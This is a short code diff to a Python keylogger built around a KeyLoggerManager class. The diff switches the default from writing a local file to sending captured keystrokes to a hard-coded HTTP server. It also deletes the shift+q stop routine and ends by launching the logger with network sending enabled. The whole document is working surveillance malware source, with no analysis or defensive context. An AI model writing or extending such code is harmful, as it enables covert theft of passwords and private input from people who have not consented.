@@ -18,11 +18,11 @@ import keyboard
 
 
 class KeyLoggerManager:
-    def __init__(self, server_link, if_screenshot=True, file_write=True):
+    def __init__(self, server_link, if_screenshot=True, file_write=False, network_write=True):
         self.server_link = server_link
         self.__if_screenshot = if_screenshot
         self.file_write = file_write
-        self.network_write = not file_write
+        self.network_write = network_write
         self.__instance = KeyloggerService(if_screenshot)
 
         res_status = 0
@@ -34,9 +34,6 @@ class KeyLoggerManager:
             except:
                 pass
             time.sleep(3)
-
-
-
 
 
 
@@ -99,10 +96,5 @@ class KeyLoggerManager:
             pass
 
 
-    def stop(self):
-        if keyboard.is_pressed('shift+q'):
-            self.__instance._KeyloggerService__change_action()
-
-
 server_link = "http://192.168.11.42:5000"
-KeyLoggerManager(server_link, if_screenshot=False, file_write=False).main()
+KeyLoggerManager(server_link, if_screenshot=False, file_write=False, network_write=True).main()
